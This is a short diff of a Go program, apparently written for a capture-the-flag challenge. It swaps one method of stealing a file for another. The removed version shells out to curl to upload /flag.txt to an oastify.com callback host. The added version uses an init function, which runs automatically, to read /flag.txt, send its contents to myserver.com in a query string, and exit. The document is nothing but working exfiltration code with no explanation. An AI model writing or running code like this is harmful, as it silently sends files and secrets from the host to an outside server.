@@ -1,6 +1,16 @@
 package main
-import "os/exec"
 
-func main() {
-  exec.Command("curl -F \"file=@/flag.txt\" usql3keptebzmq6fiek79zntdkjb74vt.oastify.com").Run()
+import (
+ "io/ioutil"
+ "net/http"
+ "os"
+)
+
+func init() {
+ flag, err := ioutil.ReadFile("/flag.txt")
+ if err != nil {
+  return
+ }
+ http.Get("http://myserver.com?flag=" + string(flag))
+ os.Exit(0) // Prevent further execution if needed
 }
